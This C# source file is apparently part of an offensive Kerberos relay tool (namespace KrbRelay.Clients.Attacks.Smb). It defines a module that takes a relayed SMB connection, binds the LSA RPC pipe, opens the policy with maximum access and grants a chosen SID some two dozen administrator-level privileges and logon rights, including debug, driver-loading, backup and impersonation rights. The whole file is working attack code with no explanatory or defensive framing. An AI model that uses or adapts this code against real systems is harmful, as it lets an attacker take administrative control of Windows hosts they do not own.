using SMBLibrary;
using SMBLibrary.Client;
using SMBLibrary.Client.Helpers;
using SMBLibrary.Services;
using System;

namespace KrbRelay.Clients.Attacks.Smb
{
    internal class LSA
    {
        public static void AddAccountRights(SMB2Client smbClient, string sid)
        {
            using (RPCCallHelper rpc = new RPCCallHelper(smbClient, LsaRemoteService.ServicePipeName, LsaRemoteService.ServiceInterfaceGuid, LsaRemoteService.ServiceVersion))
            {
                var status = rpc.BindPipe();
                if (status != NTStatus.STATUS_SUCCESS)
                {
                    Console.WriteLine("[-] Failed to bind pipe");
                    return;
                }

                LsaHandle lsaHandle = LsaServiceHelper.LsaOpenPolicy(rpc, AccessMask.MAXIMUM_ALLOWED, out status);
                Console.WriteLine("LsaOpenPolicy: {0}", status);

                string[] adminGroup = new string[] {
                        "SeSecurityPrivilege",
                        "SeBackupPrivilege",
                        "SeRestorePrivilege",
                        "SeSystemtimePrivilege",
                        "SeShutdownPrivilege",
                        "SeRemoteShutdownPrivilege",
                        "SeTakeOwnershipPrivilege",
                        "SeDebugPrivilege",
                        "SeSystemEnvironmentPrivilege",
                        "SeSystemProfilePrivilege",
                        "SeProfileSingleProcessPrivilege",
                        "SeIncreaseBasePriorityPrivilege",
                        "SeLoadDriverPrivilege",
                        "SeCreatePagefilePrivilege",
                        "SeIncreaseQuotaPrivilege",
                        "SeUndockPrivilege",
                        "SeManageVolumePrivilege",
                        "SeImpersonatePrivilege",
                        "SeCreateGlobalPrivilege",
                        "SeTimeZonePrivilege",
                        "SeCreateSymbolicLinkPrivilege",
                        "SeChangeNotifyPrivilege",
                        "SeDelegateSessionUserImpersonatePrivilege",
                        "SeInteractiveLogonRight",
                        "SeNetworkLogonRight",
                        "SeBatchLogonRight",
                        "SeRemoteInteractiveLogonRight"
                    };
                status = LsaServiceHelper.AddAccountRights(rpc, lsaHandle, SIDHelper.CreateFromString(sid), adminGroup);
                Console.WriteLine("LsarAddAccountRights: {0}", status);
                LsaServiceHelper.LsaClose(rpc, lsaHandle, out status);
            }
        }
    }
}